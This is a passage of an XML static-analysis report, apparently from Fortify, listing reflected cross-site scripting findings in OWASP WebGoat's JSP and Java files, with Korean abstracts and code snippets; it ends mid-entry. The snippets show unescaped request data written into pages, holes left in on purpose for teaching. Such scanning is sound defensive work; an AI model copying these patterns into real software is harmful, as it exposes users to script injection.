                        <Issue iid="ED784EDAC44D890AB84AFB289E1ABC6A" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 66 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>66</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.CCN%&gt;" type="text" value="&lt;%=employee.getCcn()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F0C452DD95EEB75FBD4E0080F1B2DE02" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 135 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>135</LineStart>
<Snippet>				&lt;img src="images/buttons/params.jpg" alt="Show Params" name="attack?show=Params" width="92" height="20" border="0" id="params"/&gt;
				&lt;/a&gt;
				&lt;a href="attack?show=Cookies&amp;menu=&lt;%=menu%&gt;" target="_top" onclick="MM_nbGroup('down','group1','cookies','',1)" 
				onmouseover="MM_nbGroup('over','cookies','images/buttons/cookiesOver.jpg','',1)" 
				onmouseout="MM_nbGroup('out')"&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>String lessonComplete = "&lt;img src=\"images/buttons/lessonComplete.jpg\"&gt;";
String m = "menu";
String menu = request.getParameter(m);

List categories = course.getCategories();</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A0834B132B47A950D85048419A21D3F0" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>UncheckedEmail.java의 createContent() 메서드가 135 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>UncheckedEmail.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/UncheckedEmail.java</FilePath>
<LineStart>135</LineStart>
<Snippet>	    String message = s.getParser().getRawParameter(MESSAGE, "");
	    TextArea ta = new TextArea(MESSAGE, 5, 40);
	    ta.addElement(new StringElement(convertMetachars(message)));
	    tr.addElement(new TD().setAlign("LEFT").addElement(ta));
	    tr.addElement(new TD().setAlign("LEFT").setVAlign("MIDDLE")</Snippet>
<TargetFunction>org.apache.ecs.html.TextArea.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C1086C70BE44BE61D33A6BA1CEA08228" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 80 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>80</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.DESCRIPTION%&gt;" type="text" value="&lt;%=employee.getPersonalDescription()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1636E958F6F23994A4248AFCF16C1777" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 41 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>41</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPhoneNumber()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1C401E1C095A76D7097B63FE5023C1FB" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Screen.java의 makeMessages() 메서드가 231 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Screen.java</FilePath>
<LineStart>231</LineStart>
<Snippet>	String message = s.getMessage();

	f.addElement(message);

	return (f);</Snippet>
<TargetFunction>org.apache.ecs.html.Font.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E8AD8E60B644BDD824B4A060599C2A71" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>				&lt;TR&gt;
					&lt;TD colspan="4"&gt;
						&lt;textarea name="&lt;%=RoleBasedAccessControl.DISCIPLINARY_NOTES%&gt;" cols="53" rows="2" wrap="off" class="lesson_text_db" &gt;&lt;%=employee.getDisciplinaryActionNotes()%&gt;&lt;/textarea&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="13F57C7B27DDB2B604B46E9B31966861" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;span class="lesson_text_db"&gt;&lt;%=employee.getSsn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8D22FAB87251E85DC7AA3B76E1149F06" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 99 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>99</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionNotes()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BA551CFA0A5A41D0C3A86DB798185B11" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;span class="lesson_text_db"&gt;&lt;%=employee.getAddress1()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="81B34FB358F9A709EFB3FEF0E850CEE8" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Screen.java의 makeMessages() 메서드가 231 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/Screen.java</FilePath>
<LineStart>231</LineStart>
<Snippet>	String message = s.getMessage();

	f.addElement(message);

	return (f);</Snippet>
<TargetFunction>org.apache.ecs.html.Font.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1D586AAD3C557F3A47579781B98A2516" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="4CB08DD463955436C1932DCF5C8E1829" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 94 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>94</LineStart>
<Snippet>							EmployeeStub stub = (EmployeeStub) i.next();
								%&gt;
								&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()%&gt;&lt;/option&gt;
						&lt;%}%&gt;
						&lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A49178708D7AEB78D5266AAFA780655F" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 109 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>109</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F0C452DD95EEB75FBD4E0080F1B2DE01" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 130 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>130</LineStart>
<Snippet>				&lt;/a&gt;
				&lt;%}%&gt;
				&lt;a href="attack?show=Params&amp;menu=&lt;%=menu%&gt;" target="_top" onclick="MM_nbGroup('down','group1','params','',1)" 
				onmouseover="MM_nbGroup('over','params','images/buttons/paramsOver.jpg','',1)" 
				onmouseout="MM_nbGroup('out')"&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>String lessonComplete = "&lt;img src=\"images/buttons/lessonComplete.jpg\"&gt;";
String m = "menu";
String menu = request.getParameter(m);

List categories = course.getCategories();</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="851F1B35A599794498CC0F63F7E17E25" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 109 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>109</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="EFDD9E329B720308BC164C3E8938BC87" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CE6B8C681BBCBF2F0F9EAD536B6FDED6" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 123 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=CrossSiteScripting.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=CrossSiteScripting.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=CrossSiteScripting.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0B0B26961F953FFA53C068463FF75C3E" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;span class="lesson_text_db"&gt;&lt;%=employee.getLastName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="8DC6559F8C9AF9B69ABBD6D0A51706BB" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 45 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>45</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getPhoneNumber()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B722FB4392E8CC4ABAF9D0E8403975B0" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 105 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>105</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B681F5DE5AE745E50DE8E9B4DA387226" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 67 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
